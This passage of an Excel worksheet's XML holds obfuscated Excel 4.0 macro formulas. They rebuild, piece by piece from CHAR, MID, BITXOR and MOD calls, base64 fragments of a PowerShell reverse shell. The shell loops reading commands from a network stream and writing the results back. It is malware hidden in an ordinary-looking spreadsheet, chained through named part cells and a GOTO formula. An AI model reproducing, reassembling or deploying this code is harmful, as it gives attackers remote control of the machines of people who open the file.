      </c>
      <c r="BN119" t="s">
        <v>1113</v>
      </c>
      <c r="BT119" t="str">
        <f>CONCATENATE(MID("mzQrlhpvg",3,1),CHAR(65),CHAR(107),CHAR(INT("65")),MID("rGzewy",2,1),CHAR(INT("73")),MID("jAgbf",2,1),CHAR(MOD(504,403)),CHAR(INT("81")),CHAR(INT("66")),CHAR(INT("48")),CHAR(_xlfn.BITXOR(368,305)),CHAR(INT("71")),CHAR(INT("85")),CHAR(_xlfn.BITXOR(740,677)))</f>
        <v>QAkAGIAeQB0AGUA</v>
      </c>
      <c r="BV119" t="s">
        <v>1114</v>
      </c>
      <c r="CB119" t="s">
        <v>1115</v>
      </c>
      <c r="DC119" t="b">
        <f bx="1">part24=$DC$118</f>
        <v>0</v>
      </c>
    </row>
    <row r="120" spans="2:107" x14ac:dyDescent="0.3">
      <c r="J120" t="s">
        <v>1116</v>
      </c>
      <c r="K120" t="s">
        <v>1117</v>
      </c>
      <c r="R120" t="s">
        <v>1118</v>
      </c>
      <c r="AS120" t="s">
        <v>1119</v>
      </c>
      <c r="BJ120" t="s">
        <v>1120</v>
      </c>
      <c r="BT120" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(827,856)),CHAR(MOD(542,423)),MID("Atlfzqz",1,1),CHAR(INT("103")),MID("aAjatb",2,1),MID("xzoD",4,1),MID("vo0ii",3,1),CHAR(65),CHAR(_xlfn.BITXOR(293,364)),CHAR(MOD(139,74)),MID("prwktteAf",8,1),CHAR(119),CHAR(_xlfn.BITXOR(127,62)),CHAR(INT("67")),CHAR(52))</f>
        <v>cwAgAD0AIAAwAC4</v>
      </c>
      <c r="BU120" t="s">
        <v>1121</v>
      </c>
      <c r="CE120" t="s">
        <v>1122</v>
      </c>
      <c r="CO120" t="s">
        <v>1123</v>
      </c>
      <c r="CR120" t="s">
        <v>1124</v>
      </c>
      <c r="CX120" t="s">
        <v>1125</v>
      </c>
      <c r="DC120" t="str">
        <f>CONCATENATE(CHAR(INT("87")),CHAR(INT("119")),CHAR(66),CHAR(INT("48")),CHAR(65),CHAR(_xlfn.BITXOR(333,266)),CHAR(MOD(178,93)),CHAR(65),CHAR(INT("101")),CHAR(INT("65")),CHAR(66),CHAR(INT("48")),CHAR(65),CHAR(67),CHAR(_xlfn.BITXOR(700,648)),MID("vApomqp",2,1),MID("fveZ",4,1),MID("byufQ",5,1))</f>
        <v>WwB0AGUAeAB0AC4AZQ</v>
      </c>
    </row>
    <row r="121" spans="2:107" x14ac:dyDescent="0.3">
      <c r="AT121" t="s">
        <v>1126</v>
      </c>
      <c r="AW121" t="s">
        <v>1127</v>
      </c>
      <c r="BT121" t="str">
        <f>CONCATENATE(CHAR(MOD(541,476)),CHAR(76),CHAR(MOD(276,173)),CHAR(INT("65")),CHAR(MOD(593,543)),MID("sgrAl",4,1),MID("uykghdDfp",7,1),CHAR(_xlfn.BITXOR(668,713)),CHAR(_xlfn.BITXOR(91,26)),MID("riadakNa",7,1),CHAR(MOD(484,403)),CHAR(_xlfn.BITXOR(13,76)))</f>
        <v>ALgA2ADUANQA</v>
      </c>
      <c r="CU121" t="s">
        <v>1128</v>
      </c>
      <c r="DC121" t="str">
        <f>CONCATENATE(CHAR(66),CHAR(MOD(586,469)),CHAR(INT("65")),CHAR(MOD(176,105)),CHAR(_xlfn.BITXOR(878,803)),MID("jAvcuamzj",2,1),MID("gbwgh",2,1),CHAR(INT("119")),CHAR(INT("66")),CHAR(MOD(694,587)),CHAR(MOD(234,169)),CHAR(71),CHAR(MOD(489,382)),CHAR(65),MID("sbkq",2,1),CHAR(_xlfn.BITXOR(661,754)))</f>
        <v>BuAGMAbwBkAGkAbg</v>
      </c>
    </row>
    <row r="122" spans="2:107" x14ac:dyDescent="0.3">
      <c r="R122" t="s">
        <v>1129</v>
      </c>
      <c r="U122" t="s">
        <v>1130</v>
      </c>
      <c r="V122" t="s">
        <v>1131</v>
      </c>
      <c r="AJ122" t="s">
        <v>1132</v>
      </c>
      <c r="AR122" t="s">
        <v>1133</v>
      </c>
      <c r="AX122" t="s">
        <v>1134</v>
      </c>
      <c r="BE122" t="s">
        <v>1135</v>
      </c>
      <c r="BH122" t="s">
        <v>1136</v>
      </c>
      <c r="BN122" t="s">
        <v>1137</v>
      </c>
      <c r="BT122" t="str">
        <f>CONCATENATE($BT$118,$BT$119,$BT$120,$BT$121)</f>
        <v>YgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQA</v>
      </c>
      <c r="BX122" t="s">
        <v>1138</v>
      </c>
      <c r="CD122" t="s">
        <v>1139</v>
      </c>
      <c r="CE122" t="s">
        <v>1140</v>
      </c>
      <c r="CK122" t="s">
        <v>1141</v>
      </c>
      <c r="CP122" t="s">
        <v>1142</v>
      </c>
      <c r="DB122" t="s">
        <v>1143</v>
      </c>
      <c r="DC122" t="str">
        <f>CONCATENATE(CHAR(INT("66")),MID("dfshgn",6,1),CHAR(_xlfn.BITXOR(572,637)),CHAR(_xlfn.BITXOR(382,312)),CHAR(MOD(520,472)),CHAR(65),CHAR(MOD(550,471)),MID("jkgh",3,1),CHAR(65),CHAR(_xlfn.BITXOR(630,576)),CHAR(INT("65")),CHAR(MOD(300,231)),CHAR(INT("69")),CHAR(_xlfn.BITXOR(247,182)),CHAR(85))</f>
        <v>BnAF0AOgA6AEEAU</v>
      </c>
    </row>
    <row r="123" spans="2:107" x14ac:dyDescent="0.3">
      <c r="J123" t="s">
        <v>1144</v>
      </c>
      <c r="V123" t="s">
        <v>1145</v>
      </c>
      <c r="AN123" t="s">
        <v>1146</v>
      </c>
      <c r="AT123" t="s">
        <v>1147</v>
      </c>
      <c r="BD123" t="s">
        <v>1148</v>
      </c>
      <c r="BJ123" t="s">
        <v>1149</v>
      </c>
      <c r="BO123" t="s">
        <v>1150</v>
      </c>
      <c r="BT123" t="b">
        <f bx="1">part7=$BT$122</f>
        <v>0</v>
      </c>
      <c r="CZ123" t="s">
        <v>1151</v>
      </c>
      <c r="DA123" t="s">
        <v>1152</v>
      </c>
      <c r="DC123" t="str">
        <f>CONCATENATE(MID("trnudrqww",8,1),CHAR(INT("66")),CHAR(INT("68")),MID("Agrep",1,1),CHAR(69),CHAR(107),CHAR(_xlfn.BITXOR(822,887)),CHAR(MOD(549,466)),CHAR(81),CHAR(MOD(643,578)),MID("eutkupz",6,1),CHAR(MOD(656,591)))</f>
        <v>wBDAEkASQApA</v>
      </c>
    </row>
    <row r="124" spans="2:107" x14ac:dyDescent="0.3">
      <c r="C124" t="s">
        <v>1153</v>
      </c>
      <c r="K124" t="s">
        <v>1154</v>
      </c>
      <c r="L124" t="s">
        <v>1155</v>
      </c>
      <c r="O124" t="s">
        <v>1156</v>
      </c>
      <c r="AC124" t="s">
        <v>1157</v>
      </c>
      <c r="AS124" t="s">
        <v>1158</v>
      </c>
      <c r="BA124" t="s">
        <v>1159</v>
      </c>
      <c r="BE124" t="s">
        <v>1160</v>
      </c>
      <c r="BR124" t="s">
        <v>1161</v>
      </c>
      <c r="BT124" t="str">
        <f>CONCATENATE(CHAR(INT("122")),CHAR(_xlfn.BITXOR(361,296)),MID("bwyDabh",4,1),CHAR(INT("85")),CHAR(_xlfn.BITXOR(277,340)),CHAR(_xlfn.BITXOR(157,251)),CHAR(65),CHAR(65),CHAR(108),CHAR(MOD(454,389)),MID("djrH",4,1),CHAR(_xlfn.BITXOR(210,161)),CHAR(_xlfn.BITXOR(878,815)),CHAR(77),MID("dqAwvn",3,1),CHAR(INT("66")))</f>
        <v>zADUAfAAlAHsAMAB</v>
      </c>
      <c r="CO124" t="s">
        <v>1162</v>
      </c>
      <c r="CY124" t="s">
        <v>1163</v>
      </c>
      <c r="DC124" t="str">
        <f>CONCATENATE($DC$120,$DC$121,$DC$122,$DC$123)</f>
        <v>WwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApA</v>
      </c>
    </row>
    <row r="125" spans="2:107" x14ac:dyDescent="0.3">
      <c r="C125" t="s">
        <v>1164</v>
      </c>
      <c r="K125" t="s">
        <v>1165</v>
      </c>
      <c r="V125" t="s">
        <v>1166</v>
      </c>
      <c r="BD125" t="s">
        <v>1167</v>
      </c>
      <c r="BT125" t="str">
        <f>CONCATENATE(CHAR(MOD(140,83)),CHAR(_xlfn.BITXOR(779,842)),MID("jteDvo",4,1),CHAR(MOD(455,340)),MID("Akkzq",1,1),MID("oadlfrjsn",3,1),CHAR(_xlfn.BITXOR(471,416)),CHAR(MOD(171,105)),MID("xgxtjlou",7,1),CHAR(MOD(650,585)),CHAR(_xlfn.BITXOR(806,865)),CHAR(_xlfn.BITXOR(627,536)),MID("qAhfpftx",2,1),CHAR(98))</f>
        <v>9ADsAdwBoAGkAb</v>
      </c>
      <c r="BV125" t="s">
        <v>1168</v>
      </c>
      <c r="BW125" t="s">
        <v>1169</v>
      </c>
      <c r="BY125" t="s">
        <v>1170</v>
      </c>
      <c r="CO125" t="s">
        <v>1171</v>
      </c>
      <c r="DC125" t="b">
        <f bx="1">part25=$DC$124</f>
        <v>0</v>
      </c>
    </row>
    <row r="126" spans="2:107" x14ac:dyDescent="0.3">
      <c r="O126" t="s">
        <v>1172</v>
      </c>
      <c r="AJ126" t="s">
        <v>1173</v>
      </c>
      <c r="AU126" t="s">
        <v>1174</v>
      </c>
      <c r="BK126" t="s">
        <v>1175</v>
      </c>
      <c r="BT126" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(_xlfn.BITXOR(311,373)),MID("wlui",2,1),CHAR(MOD(443,378)),CHAR(MOD(594,527)),CHAR(_xlfn.BITXOR(377,286)),CHAR(MOD(536,471)),CHAR(MOD(333,258)),CHAR(MOD(347,282)),CHAR(_xlfn.BITXOR(405,468)),MID("srkity",3,1),CHAR(INT("65")),CHAR(MOD(566,495)),MID("akvrtwq",2,1))</f>
        <v>ABlACgAKAAkAGk</v>
      </c>
      <c r="BW126" t="s">
        <v>1176</v>
      </c>
      <c r="CN126" t="s">
        <v>1177</v>
      </c>
      <c r="CX126" t="s">
        <v>1178</v>
      </c>
      <c r="DC126" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(983,916)),CHAR(INT("52")),CHAR(65),MID("nkRvhbod",3,1),CHAR(119),CHAR(_xlfn.BITXOR(635,569)),CHAR(MOD(563,455)),CHAR(INT("65")),MID("xgmtHv",5,1),CHAR(_xlfn.BITXOR(594,515)),CHAR(MOD(447,382)),CHAR(INT("81")),CHAR(_xlfn.BITXOR(43,76)),CHAR(INT("66")),CHAR(MOD(327,274)))</f>
        <v>C4ARwBlAHQAQgB5</v>
      </c>
    </row>
    <row r="127" spans="2:107" x14ac:dyDescent="0.3">
      <c r="B127" t="s">
        <v>1179</v>
      </c>
      <c r="F127" t="s">
        <v>1180</v>
      </c>
      <c r="I127" t="s">
        <v>1181</v>
      </c>
      <c r="AE127" t="s">
        <v>1182</v>
      </c>
      <c r="AP127" t="s">
        <v>1183</v>
      </c>
      <c r="AX127" t="s">
        <v>1184</v>
      </c>
      <c r="BT127" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(73),MID("huzghvA",7,1),CHAR(65),CHAR(MOD(581,524)),CHAR(_xlfn.BITXOR(563,626)),MID("ypocC",5,1),MID("yjjeA",5,1),CHAR(INT("65")),MID("juvtvJc",6,1),CHAR(MOD(224,159)),CHAR(INT("66")),CHAR(122),MID("hvfAqz",4,1),CHAR(MOD(318,246)),CHAR(INT("81")))</f>
        <v>AIAA9ACAAJABzAHQ</v>
      </c>
      <c r="DB127" t="s">
        <v>1185</v>
      </c>
      <c r="DC127" t="str">
        <f>CONCATENATE(CHAR(MOD(351,286)),CHAR(72),CHAR(_xlfn.BITXOR(697,744)),CHAR(_xlfn.BITXOR(612,549)),CHAR(MOD(214,124)),CHAR(81),MID("fBbnn",2,1),CHAR(INT("122")),CHAR(65),CHAR(INT("67")),CHAR(INT("103")),MID("Ahjcl",1,1),MID("Jkxq",1,1),MID("orAafymag",3,1),CHAR(MOD(276,210)),CHAR(_xlfn.BITXOR(476,422)))</f>
        <v>AHQAZQBzACgAJABz</v>
      </c>
    </row>
    <row r="128" spans="2:107" x14ac:dyDescent="0.3">
      <c r="K128" t="s">
        <v>1186</v>
      </c>
      <c r="X128" t="s">
        <v>1187</v>
      </c>
      <c r="AW128" t="s">
        <v>1188</v>
      </c>
      <c r="BE128" t="s">
        <v>1189</v>
      </c>
      <c r="BP128" t="s">
        <v>1190</v>
      </c>
      <c r="BT128" t="str">
        <f>CONCATENATE($BT$124,$BT$125,$BT$126,$BT$127)</f>
        <v>zADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQ</v>
      </c>
      <c r="CK128" t="s">
        <v>1191</v>
      </c>
      <c r="CL128" t="s">
        <v>1192</v>
      </c>
      <c r="DC128" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(71),CHAR(85),CHAR(_xlfn.BITXOR(454,391)),MID("exiklfbee",7,1),CHAR(103),CHAR(_xlfn.BITXOR(234,168)),CHAR(INT("107")),MID("Akkffjyet",1,1),MID("Gzapzt",1,1),MID("ckItn",3,1),CHAR(MOD(239,174)),CHAR(INT("89")),CHAR(INT("81")),CHAR(INT("66")),CHAR(_xlfn.BITXOR(744,642)))</f>
        <v>AGUAbgBkAGIAYQBj</v>
      </c>
    </row>
    <row r="129" spans="2:107" x14ac:dyDescent="0.3">
      <c r="AB129" t="s">
        <v>1193</v>
      </c>
      <c r="AH129" t="s">
        <v>1194</v>
      </c>
      <c r="AM129" t="s">
        <v>1195</v>
      </c>
      <c r="BA129" t="s">
        <v>1196</v>
      </c>
      <c r="BG129" t="s">
        <v>1197</v>
      </c>
      <c r="BT129" t="b">
        <f bx="1">part8=$BT$128</f>
        <v>0</v>
      </c>
      <c r="BX129" t="s">
        <v>1198</v>
      </c>
      <c r="CU129" t="s">
        <v>1199</v>
      </c>
      <c r="CX129" t="s">
        <v>1200</v>
      </c>
      <c r="CZ129" t="s">
        <v>1201</v>
      </c>
      <c r="DC129" t="str">
        <f>CONCATENATE(MID("utAw",3,1),CHAR(71),CHAR(_xlfn.BITXOR(234,153)),CHAR(MOD(472,407)),CHAR(_xlfn.BITXOR(725,664)),CHAR(103),CHAR(65),CHAR(MOD(297,185)),CHAR(INT("65")),MID("tmpxbjsDg",8,1),CHAR(115),CHAR(65))</f>
        <v>AGsAMgApADsA</v>
      </c>
    </row>
    <row r="130" spans="2:107" x14ac:dyDescent="0.3">
      <c r="L130" t="s">
        <v>1202</v>
      </c>
      <c r="M130" t="s">
        <v>1203</v>
      </c>
      <c r="Q130" t="s">
        <v>1204</v>
      </c>
      <c r="W130" t="s">
        <v>1205</v>
      </c>
      <c r="AE130" t="s">
        <v>1206</v>
      </c>
      <c r="AM130" t="s">
        <v>1207</v>
      </c>
      <c r="BJ130" t="s">
        <v>1208</v>
      </c>
      <c r="BR130" t="s">
        <v>1209</v>
      </c>
      <c r="BT130" t="s">
        <v>1210</v>
      </c>
      <c r="BY130" t="s">
        <v>1211</v>
      </c>
      <c r="CG130" t="s">
        <v>1212</v>
      </c>
      <c r="DC130" t="str">
        <f>CONCATENATE($DC$126,$DC$127,$DC$128,$DC$129)</f>
        <v>C4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsA</v>
      </c>
    </row>
    <row r="131" spans="2:107" x14ac:dyDescent="0.3">
      <c r="K131" t="s">
        <v>1213</v>
      </c>
      <c r="Q131" t="s">
        <v>1214</v>
      </c>
      <c r="W131" t="s">
        <v>1215</v>
      </c>
      <c r="AA131" t="s">
        <v>1216</v>
      </c>
      <c r="AQ131" t="s">
        <v>1217</v>
      </c>
      <c r="AX131" t="s">
        <v>1218</v>
      </c>
      <c r="AZ131" t="s">
        <v>1219</v>
      </c>
      <c r="BF131" t="s">
        <v>1220</v>
      </c>
      <c r="BT131" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(_xlfn.BITXOR(982,949)),CHAR(MOD(521,418)),CHAR(INT("66")),CHAR(INT("108")),CHAR(65),CHAR(71),CHAR(INT("69")),CHAR(INT("65")),MID("wbve",2,1),CHAR(_xlfn.BITXOR(915,962)),MID("xwmdAn",5,1),MID("qmbnzumwi",6,1),CHAR(MOD(467,402)),CHAR(_xlfn.BITXOR(24,94)),CHAR(INT("73")))</f>
        <v>AcgBlAGEAbQAuAFI</v>
      </c>
      <c r="BV131" t="s">
        <v>1221</v>
      </c>
      <c r="CD131" t="s">
        <v>1222</v>
      </c>
      <c r="CN131" t="s">
        <v>1223</v>
      </c>
      <c r="CZ131" t="s">
        <v>1224</v>
      </c>
      <c r="DC131" t="b">
        <f bx="1">part26=$DC$130</f>
        <v>0</v>
      </c>
    </row>
    <row r="132" spans="2:107" x14ac:dyDescent="0.3">
      <c r="AJ132" t="s">
        <v>1225</v>
      </c>
      <c r="AX132" t="s">
        <v>1226</v>
      </c>
      <c r="BR132" t="s">
        <v>1227</v>
      </c>
      <c r="BT132" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(_xlfn.BITXOR(869,831)),CHAR(INT("81")),MID("kmxB",4,1),CHAR(INT("104")),CHAR(INT("65")),MID("bajGc",4,1),MID("nxQnapzvn",3,1),CHAR(INT("65")),CHAR(MOD(378,303)),CHAR(65),CHAR(INT("65")),CHAR(INT("107")),MID("Aksmryt",1,1),CHAR(_xlfn.BITXOR(727,656)))</f>
        <v>AZQBhAGQAKAAkAG</v>
      </c>
      <c r="CL132" t="s">
        <v>1228</v>
      </c>
      <c r="CN132" t="s">
        <v>1229</v>
      </c>
      <c r="CP132" t="s">
        <v>1230</v>
      </c>
      <c r="CU132" t="s">
        <v>1231</v>
      </c>
      <c r="DC132" t="str">
        <f>CONCATENATE(MID("cqJr",3,1),CHAR(65),MID("Bkhrwnvwe",1,1),CHAR(_xlfn.BITXOR(165,223)),MID("grgpAy",5,1),CHAR(MOD(454,382)),MID("nsQat",3,1),CHAR(65),CHAR(INT("99")),MID("pigx",3,1),CHAR(_xlfn.BITXOR(309,375)),MID("lpsd",1,1),CHAR(_xlfn.BITXOR(186,251)),CHAR(71),CHAR(69),MID("tukAix",4,1),CHAR(98))</f>
        <v>JABzAHQAcgBlAGEAb</v>
      </c>
    </row>
    <row r="133" spans="2:107" x14ac:dyDescent="0.3">
      <c r="Q133" t="s">
        <v>1232</v>
      </c>
      <c r="W133" t="s">
        <v>1233</v>
      </c>
      <c r="Y133" t="s">
        <v>1234</v>
      </c>
      <c r="AN133" t="s">
        <v>1235</v>
      </c>
      <c r="AY133" t="s">
        <v>1236</v>
      </c>
      <c r="BE133" t="s">
        <v>1237</v>
      </c>
      <c r="BI133" t="s">
        <v>1238</v>
      </c>
      <c r="BL133" t="s">
        <v>1239</v>
      </c>
      <c r="BR133" t="s">
        <v>1240</v>
      </c>
      <c r="BT133" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(226,171)),CHAR(INT("65")),MID("naatldeo",7,1),CHAR(MOD(230,149)),MID("uufBnui",4,1),MID("yvlg0cv",5,1),MID("oxvAho",4,1),CHAR(MOD(183,112)),CHAR(MOD(259,174)),CHAR(MOD(356,291)),CHAR(99),CHAR(MOD(257,138)),CHAR(_xlfn.BITXOR(61,124)),CHAR(MOD(424,309)))</f>
        <v>IAeQB0AGUAcwAs</v>
      </c>
      <c r="CE133" t="s">
        <v>1241</v>
      </c>
      <c r="CZ133" t="s">
        <v>1242</v>
      </c>
      <c r="DB133" t="s">
        <v>1243</v>
      </c>
      <c r="DC133" t="str">
        <f>CONCATENATE(MID("waqorwQbn",7,1),CHAR(65),MID("unbfnx",1,1),CHAR(INT("65")),MID("lgonxzfF",8,1),MID("dhcgihw",3,1),CHAR(_xlfn.BITXOR(221,156)),CHAR(MOD(659,560)),MID("ygvvh",2,1),CHAR(INT("66")),MID("qgapzc",4,1),CHAR(INT("65")),CHAR(72),CHAR(INT("81")),CHAR(INT("65")))</f>
        <v>QAuAFcAcgBpAHQA</v>
      </c>
    </row>
    <row r="134" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BC134" t="s">
        <v>1244</v>
      </c>
      <c r="BH134" t="s">
        <v>1245</v>
      </c>
      <c r="BK134" t="s">
        <v>1246</v>
      </c>
      <c r="BT134" t="str">
        <f>CONCATENATE(MID("Apes",1,1),CHAR(MOD(193,126)),CHAR(65),MID("dysAcjt",4,1),CHAR(MOD(156,79)),CHAR(_xlfn.BITXOR(107,42)),CHAR(_xlfn.BITXOR(212,149)),CHAR(MOD(536,421)),CHAR(65),CHAR(MOD(445,378)),CHAR(_xlfn.BITXOR(602,539)),CHAR(65),MID("ibpJ",4,1),CHAR(MOD(491,426)),CHAR(MOD(566,500)))</f>
        <v>ACAAMAAsACAAJAB</v>
      </c>
      <c r="BW134" t="s">
        <v>1247</v>
      </c>
      <c r="DA134" t="s">
        <v>1248</v>
      </c>
      <c r="DB134" t="s">
        <v>1249</v>
      </c>
      <c r="DC134" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(985,899)),CHAR(INT("81")),MID("eqlvA",5,1),CHAR(111),CHAR(65),CHAR(MOD(263,196)),CHAR(MOD(192,111)),CHAR(MOD(173,108)),CHAR(_xlfn.BITXOR(843,808)),CHAR(MOD(718,599)),MID("Blzwfmwux",1,1),CHAR(_xlfn.BITXOR(459,423)),CHAR(_xlfn.BITXOR(434,499)),CHAR(INT("71")),CHAR(52))</f>
        <v>ZQAoACQAcwBlAG4</v>
      </c>
    </row>
    <row r="135" spans="2:107" x14ac:dyDescent="0.3">
      <c r="B135" t="s">
        <v>1250</v>
      </c>
      <c r="C135" t="s">
        <v>1251</v>
      </c>
      <c r="K135" t="s">
        <v>1252</v>
      </c>
      <c r="N135" t="s">
        <v>1253</v>
      </c>
      <c r="T135" t="s">
        <v>1254</v>
      </c>
      <c r="X135" t="s">
        <v>1255</v>
      </c>
      <c r="Y135" t="s">
        <v>1256</v>
      </c>
      <c r="AH135" t="s">
        <v>1257</v>
      </c>
      <c r="AM135" t="s">
        <v>1258</v>
      </c>
      <c r="AS135" t="s">
        <v>1259</v>
      </c>
      <c r="BT135" t="str">
        <f>CONCATENATE(MID("iiqlgj",2,1),CHAR(_xlfn.BITXOR(13,76)))</f>
        <v>iA</v>
      </c>
      <c r="BW135" t="s">
        <v>1260</v>
      </c>
      <c r="CH135" t="s">
        <v>1261</v>
      </c>
      <c r="CL135" t="s">
        <v>1262</v>
      </c>
      <c r="CP135" t="s">
        <v>1263</v>
      </c>
      <c r="CR135" t="s">
        <v>1264</v>
      </c>
      <c r="CV135" t="s">
        <v>1265</v>
      </c>
      <c r="CZ135" t="s">
        <v>1266</v>
      </c>
      <c r="DC135" t="str">
        <f>CONCATENATE(CHAR(INT("65")),CHAR(INT("90")),CHAR(_xlfn.BITXOR(303,366)),CHAR(66),MID("nijg",2,1),CHAR(MOD(492,427)),CHAR(INT("72")),CHAR(107),CHAR(65),CHAR(INT("100")),CHAR(INT("65")),CHAR(MOD(456,390)),MID("rejslp",5,1),CHAR(MOD(637,572)),CHAR(INT("67")),CHAR(MOD(374,255)))</f>
        <v>AZABiAHkAdABlACw</v>
      </c>
    </row>
    <row r="136" spans="2:107" x14ac:dyDescent="0.3">
      <c r="M136" t="s">
        <v>1267</v>
      </c>
      <c r="AP136" t="s">
        <v>1268</v>
      </c>
      <c r="AQ136" t="s">
        <v>1269</v>
      </c>
      <c r="AS136" t="s">
        <v>1270</v>
      </c>
      <c r="AW136" t="s">
        <v>1271</v>
      </c>
      <c r="BB136" t="s">
        <v>1272</v>
      </c>
      <c r="BE136" t="s">
        <v>1273</v>
      </c>
      <c r="BK136" t="s">
        <v>1274</v>
      </c>
      <c r="BL136" t="s">
        <v>1275</v>
      </c>
      <c r="BM136" t="s">
        <v>1276</v>
      </c>
      <c r="BT136" t="str">
        <f>CONCATENATE($BT$131,$BT$132,$BT$133,$BT$134,$BT$135)</f>
        <v>AcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiA</v>
      </c>
      <c r="CI136" t="s">
        <v>1277</v>
      </c>
      <c r="DC136" t="str">
        <f>CONCATENATE(MID("yljqAsmeo",5,1),MID("amfguMcs",6,1))</f>
        <v>AM</v>
      </c>
    </row>
    <row r="137" spans="2:107" x14ac:dyDescent="0.3">
      <c r="L137" t="s">
        <v>1278</v>
      </c>
      <c r="N137" t="s">
        <v>1279</v>
      </c>
      <c r="AA137" t="s">
        <v>1280</v>
      </c>
      <c r="AR137" t="s">
        <v>1281</v>
      </c>
      <c r="AW137" t="s">
        <v>1282</v>
      </c>
      <c r="BJ137" t="s">
        <v>1283</v>
      </c>
      <c r="BT137" t="b">
        <f bx="1">part9=$BT$136</f>
        <v>0</v>
      </c>
      <c r="CB137" t="s">
        <v>1284</v>
      </c>
      <c r="CY137" t="s">
        <v>1285</v>
      </c>
      <c r="DC137" t="str">
        <f>CONCATENATE($DC$132,$DC$133,$DC$134,$DC$135,$DC$136)</f>
        <v>JABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAM</v>
      </c>
    </row>
    <row r="138" spans="2:107" x14ac:dyDescent="0.3">
      <c r="F138" t="b">
        <f>GOTO($H$111)</f>
        <v>0</v>
      </c>
      <c r="S138" t="s">
        <v>1286</v>
      </c>
      <c r="U138" t="s">
        <v>1287</v>
      </c>
      <c r="V138" t="s">
        <v>1288</v>
      </c>
      <c r="BA138" t="s">
        <v>1289</v>
      </c>
      <c r="BM138" t="s">
        <v>1290</v>
      </c>
      <c r="BR138" t="s">
        <v>1291</v>
      </c>
      <c r="BT138" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(770,842)),CHAR(107),CHAR(_xlfn.BITXOR(587,522)),MID("dctwysf",1,1),MID("sndeA",5,1),CHAR(66),CHAR(108),MID("etdndeAur",7,1),CHAR(_xlfn.BITXOR(766,694)),CHAR(MOD(457,380)),CHAR(_xlfn.BITXOR(1020,957)),CHAR(MOD(377,301)),CHAR(INT("103")),CHAR(INT("66")),CHAR(INT("77")))</f>
        <v>HkAdABlAHMALgBM</v>
      </c>
      <c r="BU138" t="s">
        <v>1292</v>
      </c>
      <c r="BV138" t="s">
        <v>1293</v>
      </c>
      <c r="BW138" t="s">
        <v>1294</v>
      </c>
      <c r="BX138" t="s">
        <v>1295</v>
      </c>
      <c r="CE138" t="s">
        <v>1296</v>
      </c>
      <c r="CQ138" t="s">
        <v>1297</v>
      </c>
      <c r="CX138" t="s">
        <v>1298</v>
      </c>
      <c r="DC138" t="b">
        <f bx="1">part27=$DC$137</f>
        <v>0</v>
      </c>
    </row>
    <row r="139" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT139" t="str">
        <f>CONCATENATE(CHAR(INT("65")),MID("ubGp",3,1),CHAR(INT("85")),CHAR(MOD(337,272)),MID("brxxr",1,1),CHAR(INT("103")),CHAR(MOD(394,328)),CHAR(INT("110")),CHAR(MOD(612,547)),CHAR(MOD(534,462)),CHAR(INT("81")),CHAR(MOD(183,118)),MID("ovla",4,1),CHAR(INT("65")),MID("lAsdpmm",2,1))</f>
        <v>AGUAbgBnAHQAaAA</v>
      </c>
      <c r="DC139" t="s">
        <v>1299</v>
      </c>
    </row>
    <row r="140" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT140" t="str">
        <f>CONCATENATE(CHAR(INT("112")),MID("dAoloqyr",2,1),CHAR(INT("67")),MID("rkabuufr",2,1),CHAR(MOD(663,598)),CHAR(INT("73")),CHAR(65),CHAR(65),MID("sjtzjny",3,1),CHAR(65),CHAR(MOD(259,188)),CHAR(52),CHAR(INT("65")),MID("izgZqa",4,1),CHAR(MOD(252,171)),CHAR(65),MID("lfjcgtegi",8,1))</f>
        <v>pACkAIAAtAG4AZQAg</v>
      </c>
      <c r="DC140" t="str">
        <f>CONCATENATE(MID("tAesr",2,1),CHAR(65),CHAR(MOD(514,399)),MID("jAifr",2,1),CHAR(INT("67")),CHAR(_xlfn.BITXOR(793,840)),CHAR(MOD(264,199)),CHAR(INT("99")),CHAR(119),CHAR(66),CHAR(_xlfn.BITXOR(285,369)),MID("aAkgm",2,1),CHAR(_xlfn.BITXOR(648,719)),CHAR(INT("52")),MID("aAah",2,1),CHAR(INT("90")))</f>
        <v>AAsACQAcwBlAG4AZ</v>
      </c>
    </row>
    <row r="141" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT141" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(1011,946)),CHAR(68),MID("ghAbwm",3,1),CHAR(INT("65")),CHAR(75),CHAR(81),CHAR(MOD(456,390)),MID("oajl7",5,1),CHAR(_xlfn.BITXOR(632,569)),CHAR(INT("68")),CHAR(115),CHAR(INT("65")),CHAR(MOD(540,466)),CHAR(MOD(213,148)),MID("Bzppduuu",1,1),MID("ibkivlsro",3,1))</f>
        <v>ADAAKQB7ADsAJABk</v>
      </c>
      <c r="DC141" t="str">
        <f>CONCATENATE(MID("Apmf",1,1),CHAR(_xlfn.BITXOR(259,321)),CHAR(105),CHAR(_xlfn.BITXOR(873,808)),MID("whqH",4,1),CHAR(INT("107")),CHAR(65),CHAR(100),MID("Avtmhmn",1,1),CHAR(MOD(376,310)),CHAR(INT("108")),MID("jqAhkzoyu",3,1),CHAR(MOD(505,438)),CHAR(52),CHAR(INT("65")),CHAR(INT("84")))</f>
        <v>ABiAHkAdABlAC4AT</v>
      </c>
    </row>
    <row r="142" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BT142" t="str">
